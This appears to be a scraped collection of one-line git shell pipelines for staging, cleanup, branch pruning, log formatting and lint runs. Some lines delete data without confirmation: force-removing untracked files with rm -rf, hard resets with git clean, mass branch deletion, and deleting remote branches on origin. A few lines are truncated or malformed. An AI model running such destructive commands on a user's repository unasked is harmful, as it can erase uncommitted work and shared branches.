git status | xargs -n1 | grep .rb | xargs ruby -c
git status | head -n 1 | tr -s ' ' | cut -d ' ' -f 3
git status | h -i $AXL_GIT_BOUCHONX | h -i $AXL_GIT_STATUS | h -ni $AXL_GIT_STATUS_detail
git status | grep typechange | awk '{print \$2}' | xargs git checkout
git status | grep spec | awk '{print \$2}' | xargs bin/rspec
git status | grep modified: | cut -f 2 | cut -f 4 -d ' '
git status | grep modified: | cut -d : -f 2 | xargs -n 1 git add
git status | grep modified: | cut -d ' ' -f4- | xargs git add
git status | grep modified | tr -s ' ' | cut -d ' ' -f 2
git status | grep modified | cut -f 2 -d':' | xargs git co
git status | grep modified | cut -d':' -f2 | xargs git rm
git status | grep modified | cut -d':' -f2 | xargs git add
git status | grep modified | cut --complement -c1-14 | xargs git checkout --
git status | grep modified | cut --complement -c1-14 | xargs git add
git status | grep modified | c2 | xargs git add
git status | grep modified | awk '{print $2}' | xargs git checkout
git status | grep modified | awk '{ print $2 }' | xargs git add
git status | grep deleted: | cut -d: -f2 | xargs git rm
git status | grep deleted: | cut -d : -f 2 | xargs -n 1 git rm
git status | grep deleted: | awk '{print $3}' | xargs git rm
git status | grep deleted | cut -d: -f2 | xargs -I {} git rm \
git status | grep deleted | cut -d':' -f2 | xargs git rm
git status | grep deleted | cut -d':' -f2 | xargs git add
git status | grep deleted | cut -c 15- | xargs git rm
git status | grep deleted | cut --complement -c1-14 | xargs git rm
git status | grep deleted | awk '{print \$3}' | xargs git rm
git status | grep deleted | awk '{print $3}' | xargs git rm
git status | grep both\ modified | awk '{print \$3}' | xargs vim -o
git status | grep -e modified -e new | awk '{print \$4;}' | xargs gvim
git status | grep -e modified -e new | awk '{print \$3;}' | xargs gvim
git status | grep --color=always '^[^a-z]\+\(new file:\|modified:\)' | cut -d'#' -f2-
git status | grep 'modified:' | cut -d' ' -f4 | xargs git add
git status | grep 'modified:' | awk '{print \$2}' | xargs git add
git status | grep 'modified' | awk '{print $3;}' | xargs vim -p
git status | grep 'deleted:' | sed -e 's/^#.deleted: *//' | xargs -n1 git rm
git status | grep 'deleted:' | awk '{print \$3}' | xargs git rm -f
git status | grep 'deleted:' | awk '{print \$2}' | xargs git rm -f
git status | grep 'deleted' | awk '{ print $2 }' | xargs git add
git status | grep 'On branch' | awk '{print \$3}' | pbcopy
git status | grep '.orig' | cut -d ' ' -f 2- | xargs rm -f
git status | awk '{print \$3}' | head -n 1 | pbcopy
git status -uno | grep modified: | cut -c 14- | xargs -n 1 svn log --limit 1 -q
git status -sb | percol | awk '{ print $2 }' | xargs git add
git status -s | sed s/^...// | ipt -m | xargs git add
git status -s | sed s/^...// | ipt -m -M 'Select files to add:' | xargs git add
git status -s | rg UU | cut -c 4- | xargs nvim
git status -s | percol --match-method regex | cut -c4- | xargs git diff
git status -s | percol --match-method regex | cut -c4- | xargs
git status -s | pcregrep -o1 '\ *(?:[AM]|\?\?)\ *(.+)' | while read line; do noh $TERMINAL -e $EDITOR \$line; done
git status -s | grep php | awk '{print \$2}' | xargs -n1 php -l 2>/dev/null
git status -s | grep -o '[^ \?][^ \?][^ \?]*' | grep rb | xargs rubocop
git status -s | grep '^ M' | sed 's/ M //' | xargs -n1 git difftool
git status -s | awk '{print $2}' | grep '/build/' | xargs git checkout --
git status -s . | grep '^ D' | awk '{print \$2}' | xargs git rm
git status --short | fzf-tmux -d 15 | sed 's/^.* //' | xargs git add
git status --short -b | sed 's/^.*\[/[/' | sed 's/^[^[].*/up to date/' | uniq && git status --short
git status --porcelain | sed s/\^...// | grep rb$ | xargs rubocop -a
git status --porcelain | sed -ne 's/^ M //p' | tr '\n' '\0' | tr -d '\
git status --porcelain | sed -e 's/.../\//' | xargs -L1 echo $(git rev-parse --show-toplevel)/ | sed -e 's/\/ \//\//'
git status --porcelain | grep M | cut -c 3- | while read i ; do git add $i; done
git status --porcelain | grep D | cut -c 3- | while read i ; do git rm $i; done
git status --porcelain | grep -v ^D | cut -c4- | xargs rubocop
git status --porcelain | grep -v '^[D\?]' | sed 's/^...//' | xargs -o vim -O
git status --porcelain | grep -v '^ D' | sed 's/^...//' | xargs -o vim -O
git status --porcelain | grep '^M' | awk '{print $2}' | git reset HEAD
git status --porcelain | grep '^ D ' | sed 's/ [A-Z] //g' | xargs -I '{}' git rm -q --cached --ignore-unmatch -f -r -- {} > /dev/null 2>&1
git status --porcelain | grep '??' | sed 's/^...//' | xargs /bin/rm -rf
git status --porcelain | grep ' M .*' | sed 's/.* //' | vimem
git status --porcelain | cut -c4- | grep .rb | xargs rubocop -f simple
git status --porcelain | cut -c4- | grep .rb | xargs rubocop -a
git status --porcelain | cut -c4- | grep '\.rb' | xargs rubocop
git status --porcelain | cut -c4- | grep '\.rb' | xargs bundle exec rubocop
git status --porcelain | cut -c4- | grep '.rb' | xargs rubocop
git status --porcelain | cut -c4- | grep '.rb' | xargs bundle exec rubocop -a
git status --porcelain | cut -c4- | grep '.rb' | xargs bundle exec rubocop
git stat | grep deleted | awk '{print $3}' | xargs git rm
git stash list | ipt -M 'Select stashed item to show:' --unquoted | cut -d ':' -f 1 | xargs git stash show -u
git stash list | ipt --unquoted | cut -d ':' -f 1 | xargs git stash show -u
git stash && git checkout develop && git branch --merged | grep -v master | grep -v develop | xargs git branch -d
git st -s | egrep '^UU '| cut -d ' ' -f2 | xargs gvim -p
git st -s --porcelain -uall | awk '{print \$2}' | grep '[.]py\$' | xargs pyflakes
git since-master | grep \\.rb$ | xargs ls 2>/dev/null | xargs rubocop --force-exclusion
git since-develop | grep \\.rb$ | xargs ls 2>/dev/null | xargs rubocop --force-exclusion
git show | head -n 1 | cut -d ' ' -f 2 | pbcopy
git show | head -1 | cut -d' ' -f2 | cut -c1-7
git show --oneline --no-patch | awk '{print \$1}' | tr -d '\n' | pbcopy
git rev-parse HEAD | xargs echo && git rev-parse HEAD | tr -d '\n' | pbcopy && echo 'copied to clipboard'
git rev-parse HEAD | tee /dev/tty | tr -d '\n' | pbcopy
git rev-parse --abbrev-ref HEAD | xargs git log --graph --abbrev-commit --decorate --first-parent | grep -e '\[.*\]' -m 1 | cut -c 7-
git rev-parse --abbrev-ref HEAD | tr -d '\n' | tr -d ' ' | pbcopy
git rev-parse --abbrev-ref HEAD | tee /dev/tty | tr -d '\n' | pbcopy
git rev-parse --abbrev-ref HEAD | cut -d / -f1 | xargs al ji show -f commit | git commit --verbose -e -F -
git remote prune origin; git branch --merged | grep -v '\*' | grep -v dev | xargs -n 1 git branch -d
git remote prune origin && git branch -vv | grep 'origin/.*: gone]' | cut -d ' ' -f3 | xargs -r git branch -d
git remote prune origin && git branch -vv | grep 'origin/.*: gone]' | awk '{print $1}' | xargs git branch -d
git remote prune origin && git branch -vv | grep 'origin/.*: gone]' | awk '{print $1}' | xargs -pt git branch -D
git remote prune origin && git branch -vv | grep ': gone]' | awk '{print \$1}' | xargs git branch -D
git remote prune origin && git branch -vv | grep ': gone]' | awk '{print $1}' | xargs git branch -d
git remote prune origin && git branch -vv | grep ': gone]' | awk '{print $1}' | xargs git branch -D
git remote prune origin && git branch -v | grep '\[gone\]' | awk '{print $1}' | xargs git branch -D
git remote prune origin && git branch --merged master | egrep -v 'master|develop$' | xargs git branch -d
git remote prune origin && (git branch -vv | grep 'origin/.*: gone]' | awk '{print $1}' | xargs git branch -D)
git remote -v | sed 's/origin.*:\([^.]*\).*/\1/' | head -n1 | read GH; /usr/bin/open \
git remote -v | head -1 | awk '{print $2}' | sed -e 's/https:\/\/github.com\/\(.*\)/git@github.com:\1/g'
git remote -v | awk '{ print \$1 }' | sort -u | xargs -I % sh -c 'git push %'
git remote -v | awk '/fetch/{print \$2}' | sed -Ee 's#(git@|git://)#http://#' -e 's@org:@org/@' -e 's@com:@com/@' -e 's@be:@be/@' -e 's@\.git\$@@'
git remote -v 2> /dev/null | head -n1 | awk '{print \$2}' | sed 's/.*\///;s/.*\://;s/\.git//'
git reflog | grep -o 'checkout: moving from . .. to ' | sed -e 's/checkout: moving from //' -e 's/ to $//' | head -20
git reflog | egrep -io 'moving from ([^[:space:]]+)' | awk '{ print $3 }' | head -n9
git push && git push heroku master && heroku info -s | grep web_url | cut -d= -f2 | xargs -I{} curl {} -w '%{http_code}' -so /dev/null
git pull; git remote prune origin; { git branch -vv | grep ' gone]' | awk '{print $1}' | xargs git branch -D; }
git publish | grep 'pull/new' | awk '{ print $2 }' | pbcopy && echo 'Link copied to clipboard'
git merged-branches | grep -vE '^\*|master$|develop$'
git ls-tree HEAD . | grep blob | cut -f 2 | xargs ls -alh
git ls-remote --get-url | sed 's/git@/http:\/\//g' | sed 's/com\:/com\//g'| xargs open
git ls-remote --get-url | sed 's/:/\//' | sed 's/git@/https:\/\//' | xargs open
git ls-files | xargs cat | wc -l | tr -d \
git ls-files | xargs -n1 git --no-pager blame -f -w|grep tsukamoto |wc -l
git ls-files | sed 's/.*\.//' | sort | uniq -c
git ls-files -u | cut -f 2 | sort -u | tr '\n' ' '
git ls-files -mo --exclude-standard | exists | grep _spec\.rb$ | xargs bundle exec rspec
git ls-files -m | xargs ls -1 2>/dev/null | grep '\.rb$' | xargs rubocop
git ls-files --unmerged | cut -f2 | uniq | xargs vim
git ls-files --unmerged | cut -f2 | uniq | xargs git checkout --theirs
git ls-files --unmerged | cut -f2 | uniq | xargs git checkout --ours
git log|grep \^Author:|sort|uniq
git log | head -1 | cut -d ' ' -f2 | xclip -selection clipboard
git log | grep Author | sort | uniq
git log | grep -v 'tag: ' | grep -i 'feature\|hotfix'
git log master --oneline --reverse | nl | tail -r | head -n 20
git log -p --since=yesterday --author=Steve>tmp;P=`grep ^+[^+] tmp|wc -l`;M=`grep ^-[^-] tmp|wc -l`; echo $P-.5*$M|bc;rm tmp
git log -n 3 | grep '#' | head -n 1 | cut -c5-
git log -1 | tail -n 1 | tr -d '\n' | awk -F'Differential Revision: ' '{print \$2}'
git log -1 | cut -d ' ' -f 2 | head -n 1 | pbcopy
git log --reverse --pretty=oneline | cut -c41- | nl | sort -nr
git log --reverse --pretty=%H master | grep -A 1 (git rev-parse HEAD) | tail -n1 | xargs git checkout
git log --reverse --pretty=%H master | grep -A 1 $(git rev-parse HEAD) | tail -n1 | xargs git checkout
git log --pretty=oneline | head -n 1 | cut -d' ' -f1 | xargs git show
git log --pretty=oneline | fzf +m --preview 'git log -1 --stat {1}' | awk '{print \$1}' | xargs -o -n1 -I{} git rebase -i {}^
git log --pretty=oneline | fzf +m --preview 'git log -1 --stat {1}' | awk '{print \$1}' | xargs -n1 -I{} git show {}
git log --pretty=format:'%h | %cd | %an | %s' -n 15
git log --pretty=format:'%H %s' | fzf | grep -o '^\S*' | tr -d '\n'
git log --pretty=format:'%C(yellow)%h|%Cred%ad|%Cblue%an|%Cgreen%d %Creset%s' --date=format:'%Y-%m-%d %H:%M:%S'
git log --pretty=format:'%C(yellow)%h|%Cred%ad|%C(cyan)%an|%Cgreen%d %Creset%s' --date=local
git log --pretty=format:%aN | sort | uniq -c | sort -rn
git log --pretty=format: --name-only | sort | uniq -c | sort -rg
git log --pretty=%ai . | cut -c 1-7 | sort | uniq -dc
git log --pretty=%ai . | cut -c 1-4 | sort | uniq -dc
git log --oneline --name-status master..HEAD | grep '^[ADM]' | sort | uniq
git log --oneline --branches | peco | awk '{print $1}' | xargs git cherry-pick
git log --no-merges | grep Author | sort | uniq
git log --name-only --pretty=oneline --full-index HEAD^^..HEAD | grep -vE '^[0-9a-f]{40} ' | sort | uniq
git log --name-only --pretty=oneline --full-index $1..$2 | grep -vE '^[0-9a-f]{40} ' | sort | uniq
git log --name-only --pretty=format: | sort | uniq -c | sort -nr
git log --merges --first-parent --reverse --pretty=format:'- [ ] %s %n %b %n' remotes/origin/master..remotes/origin/develop | sed -e 's/#\([0-9]\{4\}\)/https:\/\/github.com\/aerialpartners\/gtax-server\/pull\/\1/g' | sed -e 's/from aerialpartners\/feature\///g' | pbcopy;pbpaste
git log --grep snemeth --grep Szilard --grep 'Szilard Nemeth' --oneline | grep 'YARN\|SUBMARINE\|HADOOP'
git log --grep [query] | sed -n '/^commit/p' | cut -d\ -f 2 | xargs git show
git log --grep Merge | grep Date -B5 | head -n200 | tail -n4
git log --graph --pretty=format:'%h%C(yellow)%d%C(reset) | %cr | %cn | %s'
git log --graph --pretty=format:'%h - %d %s (%cr) <%an>' | nvim -R -c 'set hidden nowrap keywordprg=:enew\ \|\ terminal\ \git\ --no-pager\ show | nnoremap q :bd!<cr>' -
git log --graph --pretty=format:'%Cred%h%Creset | %an | %cn | -%C(yellow)%d%Creset %s %Cgreen(%cr)%Creset' --abbrev-commit --date=relative
git log --graph --oneline -99 | grep -A 1 -E '^\* [0-9a-f]{7}' | cut -c 5-11 | tail -1
git log --graph --full-history --all --color --pretty=format:'\''%C(yellow)%h|%Cred%ad|%Cblue%an|%Cgreen%d %Creset%s'\'' --date=local
git log --format=format:%an | sort | uniq -c | sort -r
git log --format='%an' | sort | uniq -c | sort --reverse
git log --format='%an' --since='6 months ago' | sort | uniq -c | sort -rn
git log --format='%aN' | sort | uniq -c | sort -rn
git log --decorate --graph --pretty=format:'%C(red bold) %h %C(yellow bold) | %an | %Cgreena: %ar / c: %cr | %Creset %s %C(blue bold) %d' --stat
git log --decorate --graph --pretty=format:'%C(red bold) %h %C(yellow bold) | %an | %Cgreen%cr | %Creset %s %C(blue bold) %d' --stat
git lg HEAD \`(git branch | sed -e '/(no branch)/ d' -e 's/^.* //' && git config --list | sed -n 's_^branch\\.[a-zA-Z-]\\+\\.merge=refs/heads/\\([a-zA-Z-]\\+\\)\$_origin/\\1_p') | tr '\\n' ' '\` --
git fsck | awk '/dangling commit/ {print $3}' | git show --format='SHA1: %C(yellow)%h%Creset %f' --stdin | awk '/SHA1/ {sub(\
git fsck --unreachable | grep commit | cut -d ' ' -f3 | xargs git log --merges --no-walk --grep=WIP
git fsck --unreachable | grep commit | cut -d ' ' -f3 | xargs git log --merges --no-walk --grep=
git for-each-ref refs/heads/ --format='%(refname:short)' | grep -v '^master$' | grep -v '^develop$' | xargs git branch -d
git for-each-ref refs/heads | cut -d/ -f3- | fzf | xargs git checkout
git for-each-ref --sort=committerdate refs/heads/ --format='%(refname:short)' | gtac | fzf --no-sort | xargs git checkout
git for-each-ref --sort=committerdate refs/heads/ --format='%(refname) %(committerdate) %(authorname)' | sed 's/refs\/heads\///g' | awk '{print \$1}' | tail
git for-each-ref --sort=committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) - %(color:red)%(objectname:short)%(color:reset) - %(contents:subject) - %(color:blue)%(authorname)%(color:reset) (%(color:green)%(committerdate:relative)%(color:reset))' | tail -r | nl | tail -r
git for-each-ref --sort=committerdate refs/heads --color --format='%(HEAD)%(color:bold green)%(committerdate:short)|%(color:yellow)%(refname:short)%(color:reset)'|column -ts'|'
git for-each-ref --sort=-committerdate refs/heads/ | head -10 | awk '{print $3}' | cut -d/ -f 3
git for-each-ref --format='%(committername) %09 %(committerdate:short) %09 %(refname:short)' --sort=committerdate --sort=committername | grep -e origin\/ | grep -v -e \/HEAD -e \/master | sed 's/origin\///'
git for-each-ref --format '%(refname:short)' refs/heads | grep -v master | grep -v develop | xargs git branch -D
git for-each-ref --format '%(refname:short)' refs/heads | grep -v 'master\|develop' | xargs git branch -D
git fetch origin; git remote prune origin; git branch -r --merged master | grep -v master | sed s/origin\\/// | xargs -p -n 1 git push origin --delete
git fetch -va && git branch --merged | egrep -v '(^\*|master)' | xargs git branch -d
git fetch -p; git branch -vv | grep ': gone]' | awk '{print $1}' | xargs git branch -D
git fetch -p > /dev/null 2>&1 && git branch --no-color -vv | grep 'origin/.*: gone]' | awk '{print \$1}' | xargs git branch -D
git fetch -p && git branch -vv | grep ': gone]' | awk '{print $1}' | xargs git branch -D
git fetch -p && git branch -r | awk '{print \$1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin)
git fetch -p && git branch --remote | fgrep greenkeeper | sed 's/^.\{9\}//' | xargs git push origin --delete
git fetch -p && git branch --merged | grep -v '*\|master' | xargs git branch -d
git fetch -p && git br -vv | /usr/bin/grep gone | awk '{print \$1}' | xargs git br -D
git fetch -p & git branch -vv | grep 'origin/.*: gone]' | awk '{print $1}' | xargs git branch -d
git fetch --prune; git for-each-ref --format='%(committername) %09 %(committerdate:short) %09 %(refname:short)' --sort=committerdate --sort=committername | grep -e origin\/ | grep -v -e \/HEAD -e \/master | sed 's/origin\///'
git fetch --prune; git branch -r --merged | grep -v master | sed 's/origin\///' | xargs -n 1 git push --delete origin
git fetch --prune; git branch -r --merged | grep -v -e \/master | sed 's/origin\///' | xargs -n 1 git push --delete origin
git fetch --prune > /dev/null 2>&1; prfetch | percol --match-method regex | cut -f3 | xargs -I{} git checkout -B reviewing origin/{}
git fetch --prune > /dev/null 2>&1; git branch -r | percol --match-method regex | cut -c2- | xargs git checkout -B reviewing
git fetch --prune ; git branch -lvv | cut -c3- | awk '/: gone]/ {print $1}' | xargs git branch -d
git fetch --prune && git branch -vv | grep \:\ gone\] | awk '{print \$1}' | xargs -r git branch -D
git fetch --prune && git branch -v | grep ' \[gone\] ' | awk '{ print $1 }' | xargs git branch -D
git fetch --all -p; git branch -vv | grep ': gone]' | awk '{ print \$2 }' | xargs -n 1 git branch -d
git fetch --all -p; git branch -vv | grep ': gone]' | awk '{ print \$1 }' | xargs -n 1 git branch -d
git fetch --all -p; git branch -vv | grep ': gone]' | awk '{ print \$1 }' | xargs -n 1 git branch -D
git fetch --all -p; git branch -vv | grep ': gone]' | awk '{ print $1 }' | xargs -n 1 git branch -d
git fetch --all --prune; git branch -vv | grep “: gone]” | awk ‘{print $1 }’ | xargs -n 1 branch -d
git fetch --all --prune && git branch -l -v | grep '\[gone\]' | awk '{print $1}' | xargs git branch -D
git fetch && git log --pretty=format:'%C(yellow)%h | %Cred%ad | %C(cyan)%an | %Creset%s' --date=short ^origin/master origin/develop --no-merges
git fetch && git diff-tree -r --no-commit-id --name-only master@\{u\} head | xargs ls -1 2>/dev/null | grep '\.rb$' | xargs rubocop
git difftool --extcmd='colordiff -ydw \$LOCAL \$REMOTE | grep -E -C3 \'^.{123} [|<>]( |$)\' ' -y
git diff-tree -r --no-commit-id --name-only master@\{u\} head | xargs ls -1 2>/dev/null | grep '\.rb$' | xargs rubocop -a --force-exclusion
git diff-index --quiet HEAD -- || clear; git --no-pager diff --color --patch-with-stat | diff-so-fancy
git diff | wdiff -dn | colordiff | less -r
git diff | nkf -w | colordiff | less -r
git diff | grep // && git diff | grep console. && git diff | grep TODO
git diff | egrep 'dpm|dsm|print'
git diff production --name-only | grep 'app/models' | grep '.rb' | xargs annotate
git diff origin/master..origin/chp-working --name-only | grep .install | xargs -I__INSTALL__ git diff origin/master..origin/chp-working __INSTALL__ | cat
git diff origin/master --name-only --diff-filter=ACMRTUXB | grep '\.rb$' | tr '\n' ' ' | xargs bundle exec rubocop
git diff master --name-only | grep '.rb' | grep -v 'schema' | xargs rubocop
git diff master --name-only --diff-filter=ACMR | grep '.rb' | ag -v 'schema' | xargs rubocop
git diff HEAD | diff-highlight | ~/projects/diff-so-fancy/lib/diff-so-fancy.pl | less -RFX
git diff -b --numstat | egrep $'^0\t0\t' | cut -d$'\t' -f3- | xargs git checkout HEAD --
git diff -U0 | grep '^[+-]' | grep -Ev '^(--- a/|\+\+\+ b/)'
git diff --summary | grep --color 'mode change 100755 => 100644' | cut -d' ' -f7- | xargs chmod +x
git diff --summary | grep --color 'mode change 100644 => 100755' | cut -d' ' -f7- | xargs chmod -x
git diff --numstat | cut -d$'\t' -f 1 | paste -sd+ - | bc
git diff --name-status | more | grep ^M | sed 's/^M\s*//g'
git diff --name-only | uniq | tr '\n' '\0' | xargs -0 -o vim
git diff --name-only | grep '.rb' | xargs ls 2>/dev/null | xargs rubocop
git diff --name-only | grep '.rb' | xargs ls 2>/dev/null | xargs bundle exec rspec
git diff --name-only master... | grep -v bundle | grep .jsx*$ | xargs eslint -c .eslintrc.json --stdin --quiet -f table
git diff --name-only master | xargs ls -1 2>/dev/null | grep '\.rb$' | xargs rubocop
git diff --name-only master | grep -e '\.py$' | egrep -v '.*test_.*\.py$' | xargs pylint
git diff --name-only master | grep -e '\.py$' | egrep -v '.*test_.*\.py$' | xargs pyflakes
git diff --name-only master | grep -e '\.py$' | egrep -v '.*test_.*\.py$' | xargs pep8
git diff --name-only --staged | grep '\.rb$' | grep -v 'db/schema.rb' | xargs bundle exec rubocop -a --force-exclusion
git diff --cached | nkf -w | pyenv exec pygmentize -l diff | less -R
git diff --cached --name-only | grep '.rb' | xargs ls 2>/dev/null | xargs rubocop
git diff --cached --name-only | grep '.rb' | xargs ls 2>/dev/null | xargs bundle exec rspec
git diff --cached --color-words | sort | uniq -c | less -R
git config --local -l | grep url | grep -o -i iit.* | sed -e 's/:/\//'
git config --list | grep 'alias\.' | sed 's/alias\.\([^=]*\)=\(.*\)/\1\ = \2/' | sort
git commit --dry-run --short | grep '^ D '| awk '{print $2}' | xargs git rm
git clean -nx | awk '{ print $3}' | grep -v '.sh' | xargs rm
git clean -dfnx | grep -v .idea | sed 's/Would remove //' | xargs rm -rfv
git cl status | grep '(closed)' | awk '{ print $1 }' | xargs -n1 git branch -D
git checkout master; git pull origin master; git fetch --all -p; git remote prune origin && git branch -vv | grep ': gone]' | awk '{print $1}' | xargs -r git branch -d
git checkout master && git fetch && git rebase && git fetch --prune && git branch -vv | grep ': gone]' | awk '{print $1}' | xargs git branch -d
git checkout master && git branch -l | sed 's/* master//' > /tmp/gitlocal.txt && git branch -r | sed 's/origin\///' > /tmp/gitremote.txt && grep -Fxv -f /tmp/gitremote.txt /tmp/gitlocal.txt | xargs git branch -d
git checkout develop >/dev/null 2>&1 && git fetch -p >/dev/null 2>&1 && git branch -vv | grep gone] | cut -d ' ' -f 3 | xargs git branch -d
git checkout \$(git branch -vv | fzf +m | awk '{print \$1}' | sed \
git checkout $(git tag | sort -V | tac | fzf)
git checkout $(git tag | grep prod_www | sort -r | head -n 1)
git checkout $(git branch | grep -v \* | sort | selecta)
git branch|grep -v '*'| head -1|xargs git checkout
git branch|grep '*'|tr -d '* \n'|pbcopy
git branch|grep '*'|sed 's/\*/git push origin/'|sh
git branch|grep '*'|sed 's/\*/git pull origin/'|sh
git branch |grep '^\*' |awk '{print \$NF}' |xargs -I {} git push origin HEAD:refs/for/{}
git branch |grep '^\*' |awk '{print \$NF}' |xargs -I {} git pull origin {}
git branch | tr -d \* | sed '/->/d' | xargs git grep --line-number
git branch | sed -e 's/^.* //' | grep -v master | xargs git branch -d
git branch | sed 's/^[ *]*//' | vis-menu | xargs git checkout
git branch | sed 's/^..//' | grep '^\d' | xargs git wtf
git branch | percol --match-method regex | cut -c2- | xargs git push origin
git branch | percol --match-method regex | cut -c2- | xargs git pull origin
git branch | percol --match-method regex | cut -c2- | xargs git checkout
git branch | percol --match-method regex | cut -c2- | xargs git branch -D
git branch | grep develop -v | grep master -v | xargs git branch -d
git branch | grep dev | cut -f2 -d' ' | xargs git checkout
git branch | grep ^* | cut -d ' ' -f 2 | cb
git branch | grep \\* | cut -d ' ' -f2 | xargs -i git push --set-upstream origin {}
git branch | grep \* | sed 's/\*//' | xargs git push -u origin
git branch | grep \* | cut -d ' ' -f2 | tr -d '\n'
git branch | grep \* | cut -d ' ' -f2 | pbcopy
git branch | grep \* | cut -d ' ' -f2 | awk '{ system(\
git branch | grep \* | cut -c3- | xargs git push origin
git branch | grep \* | awk -e '{print $2}' | git push --set-upstream origin -
git branch | grep -v releases | grep -v Dev | xargs git branch -D
git branch | grep -v master | grep -v develop | xargs -I % git branch -D %
git branch | grep -v master | grep -v develop | xargs -I % echo %
git branch | grep -v master | grep -v '^*' | xargs git branch -D
git branch | grep -v master | grep -v '*' | xargs git branch -D
git branch | grep -v develop | grep -v master | xargs git branch -D
git branch | grep -v 'production' |grep -v -F '*' | xargs git branch -D
git branch | grep -v 'master\|develop' | xargs git branch -D
git branch | grep -v 'master' | grep -v '*' | xargs git branch -D
git branch | grep -v 'except' | grep -v '*' | xargs git branch -D
git branch | grep -v 'develop' | grep -v 'master' | xargs git branch -D
git branch | grep -v '\*\|master' | xargs -n 1 git branch -D
git branch | grep -v '*' | grep -v 'master' | xargs git branch -D && git reset --hard && git clean -d -x -f
git branch | grep -v '*' | grep -v 'master' | xargs -I % git branch -D %
git branch | grep -Ev '(\*|master)' | xargs git branch -d
git branch | grep -E '^\*?\s*pu/' | sed -re 's/^\*?\s*//g' | xargs git branch -D
git branch | grep '^\*' | cut -d' ' -f2 | xclip -selection c
git branch | grep '^\*' | cut -d' ' -f2 | tr -d '\n'
git branch | grep '^\*' | cut -d' ' -f2 | pbcopy
git branch | grep '^[*]'; git describe; git remote -v | grep -v push; g1 -3 | cat
git branch | grep '*' | tr -d ' *\n' | pbcopy
git branch | grep '*' | awk '{print \$2}' | xargs git push origin
git branch | fzf-tmux -d 15 | sed 's/^\s*//' | xargs -d '\n' -L 1 git checkout
git branch | fzf | head -n1 | xargs git checkout
git branch | fzf | cut --characters=3- | xargs --no-run-if-empty git merge
git branch | fzf | cut --characters=3- | xargs --no-run-if-empty git checkout
git branch | fzf | awk '{print $2}' | xargs git checkout
git branch | egrep -v 'master|production' | xargs git branch -D && git remote prune origin
git branch | egrep -v 'develop|master' | xargs git branch -d
git branch | egrep -v 'develop|master' | xargs git branch -D
git branch | egrep -v '\*|m-seaster' | xargs git br -D
git branch | cut -c3-50 | fzf | xargs git checkout
git branch | cut -c3- | grep arcpatch- | xargs -n1 git branch -D
git branch | cut -c3- | fzf | xargs git checkout
git branch | cut -c 3- | selecth | xargs git checkout
git branch | cut -c 3- | selecta | xargs git checkout
git branch | cut -c 3- | pick | xargs git checkout
git branch | cut -c 3- | grep -v master | xargs -L1 git branch -d 2> /dev/null
git branch | cut -c 3- | fzy | xargs git checkout
git branch | cut -c 3- | fzy | xargs -p git branch -D
git branch | cut -c 3- | fzy -l 100 | xargs git checkout
git branch | cut -c 3- | fzf | xargs git checkout
git branch | cut -c 3- | fzf | xargs -I {} git merge {} --no-ff
git branch | \grep '*' | sed 's/* //' | xargs git push origin
git branch | \grep '*' | sed 's/* //' | xargs git pull --rebase origin
git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/\1/' || return
git branch 2> /dev/null | grep -e ^* | awk '{ print \$2 }' | pbcopy
git branch -vv|grep gone | cut -d ' ' -f 3|xargs git branch -D
git branch -vv|grep gone | cut -d ' ' -f 3|xargs
git branch -vv | grep gone\] | cut -d' ' -f3 | xargs git branch -D 2>/dev/null
git branch -vv | grep gone | awk '{print $1}' | xargs git branch -D
git branch -vv | grep disparue | xargs -0 -L1 | grep -oP '^ [^ ]+'
git branch -vv | grep -e origin\/.*:\ gone | sed -r 's/([a-zA-Z0-9-]+).*/\1/' | xargs git branch -D
git branch -vv | grep 'origin/.*: gone]' | awk '{print \$1}' | xargs git branch -d
git branch -vv | grep 'origin/.*: gone]' | awk '{print $2}' | xargs git branch
git branch -vv | grep 'origin/.*: gone]' | awk '{print $1}' | xargs git branch -d
git branch -vv | grep 'origin/.*: gone]' | awk '{print $1}' | xargs git branch -D
git branch -vv | grep ': gone]' | awk '{print $1}' | xargs git branch -d
git branch -vv | fzf +m | awk '{print \$1}' | xargs -n1 -I{} git checkout {}
git branch -vv --color=always | grep 'behind\|ahead\|gone'
git branch -vv --color=always | fzf-tmux -d 15 --ansi | cut -c3- | cut -d' ' -f1
git branch -r | grep origin\/is- | sed 's/origin\//':'/' | xargs git push origin
git branch -r | grep ci_ | sed 's/origin\///g' | xargs -n 1 git push origin --delete
git branch -r | cut -c10- | selecta | xargs git checkout
git branch -r --merged | grep -v master | sed 's/origin\//:/' | xargs -n 1 git push origin
git branch -r --merged | grep -v master | sed 's/origin\///' | xargs -n 1 git push --delete origin
git branch -r --merged | grep -v master | grep -e origin | sed -e
git branch -r --merged | grep -v HEAD | xargs -n 1 git --no-pager show -s --format='%d %an <%ae>' | grep 'Frank Moda'
git branch -r --merged | grep -v -e \/master | sed 's/origin\///' | xargs -n 1 git push --delete origin
git branch -r --merged master | sed 's/ *origin\///' | grep -v 'master$' | xargs -I% git push origin :%
git branch -r --merged master | grep -v -e master -e develop | sed -e 's% *origin/%%' | xargs -I% git push --delete origin %
git branch -r --merged develop | grep -v -e master -e develop -e design/design-mock -e planner-v2 | sed -e 's% *origin/%%' | xargs -I% git push --delete origin %
git branch -l | grep -v master | grep -v develop | xargs git branch -d && git remote prune origin
git branch -l --sort=-committerdate | pick | awk '{ print $1 }' | xargs git checkout
git branch -d `git branch --merged | grep -v '^*' | grep -v 'master' | tr -d '\n'`
git branch -a | tr -d \* | sed '/->/d' | xargs git grep -HI
git branch -a | tr -d \* | sed '/->/d' | xargs git grep --line-number
git branch -a | tr -d \* | sed '/->/d' | xargs git grep $1
git branch -a | tr -d \* | sed '/->/d' | xargs git grep
git branch -a | fzf | head -n1 | xargs git checkout
git branch -a --merged | 'grep' -v '*' | 'grep' -v master | 'grep' remotes/origin/
git branch --remotes --merged | grep -v master | sed 's@ origin/@:@' | xargs git push origin
git branch --remote --merged | grep -v /master | sed 's/origin\///' | xargs -n 1 git push --delete origin
git branch --merged| egrep -v (^*|master) | xargs git branch -d
git branch --merged | tail -r | tail -n +2 | xargs git branch -d
git branch --merged | grep —v -E ‘master|dev’ | xargs -n 1 git branch -d
git branch --merged | grep -v “\*” | grep -v “master” | xargs -n 1 git branch -d
git branch --merged | grep -v master | grep -v staging | xargs git branch -d
git branch --merged | grep -v master | grep -v develop | xargs git branch -d
git branch --merged | grep -v master | grep -v dev | xargs -n 1 git branch -d
git branch --merged | grep -v master | grep -v '*' | xargs git branch -d
